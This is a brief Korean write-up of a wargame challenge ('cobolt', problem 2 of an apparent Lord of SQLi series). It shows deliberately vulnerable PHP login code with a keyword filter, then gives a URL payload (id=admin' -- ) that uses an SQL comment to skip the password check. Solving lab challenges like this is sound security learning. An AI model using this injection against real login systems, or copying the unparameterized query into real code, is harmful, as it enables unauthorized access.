# 2번문제 cobolt

이번에는 서버가 이렇다고 한다.
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```
그러면 파라미터를 이렇게 해주면 된다.
```
https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin%27%20--%20
query : select id from prob_cobolt where id='admin' -- ' and pw=md5('')
```
1번 문제처럼, sql의 주석을 사용하면, 주석 뒤의 sql문은 무시되는 것을 이용하면 된다.
